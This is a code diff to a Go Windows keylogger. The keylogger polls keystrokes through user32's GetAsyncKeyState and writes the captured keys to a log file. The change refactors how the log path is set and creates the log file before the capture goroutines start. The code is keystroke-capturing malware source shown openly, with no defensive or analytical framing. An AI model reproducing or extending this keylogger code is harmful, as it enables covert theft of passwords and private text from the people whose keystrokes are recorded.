@@ -40,7 +40,6 @@ func (k *Keylogger) Create() *Keylogger {
 		procGetAsyncKeyState: user32.NewProc("GetAsyncKeyState"),
 		pressedKeys:          "",
 		logsPath:             DefaultLogPath,
-		logsFileName:         DefaultLogFileName,
 		chCritError:          make(chan bool, 1),
 	}
 
@@ -65,15 +64,6 @@ func (k *Keylogger) SetLogsPath(logsPath string) {
 }
 
 /*
-SetLogsFileName <Keylogger> - setting log's filename
-	Args:
-		1. logsFileName <string> - log's filename
-*/
-func (k *Keylogger) SetLogsFileName(logsFileName string) {
-	k.logsFileName = logsFileName
-}
-
-/*
 GetChCritError <Keylogger> - getting error channel
 	Returns <<-chan bool>:
 		1. Channel error
@@ -85,6 +75,15 @@ func (k *Keylogger) GetChCritError() <-chan bool {
 // Run <Keylogger> - starts the keylogger process
 func (k *Keylogger) Run() {
 	logger.InfoJ(k.lc, "Starting key's handler")
+
+	file, err := os.OpenFile(k.logsPath, os.O_CREATE, 0600)
+	if err != nil {
+		logger.CriticalJ(k.lc, fmt.Sprint("Can not create log's file: ", err.Error()))
+		k.chCritError <- true
+		return
+	}
+	file.Close()
+
 	go k.handler()
 	go k.writer()
 }
@@ -108,9 +107,9 @@ func (k *Keylogger) writer() {
 			}
 		}
 
-		file, err := os.OpenFile(fmt.Sprint(k.logsPath, k.logsFileName), os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
+		file, err := os.OpenFile(k.logsPath, os.O_APPEND|os.O_WRONLY, 0600)
 		if err != nil {
-			logger.CriticalJ(k.lc, fmt.Sprint("Can not create log's file: ", err.Error()))
+			logger.CriticalJ(k.lc, fmt.Sprint("Can not open log's file: ", err.Error()))
 			k.chCritError <- true
 			return
 		}
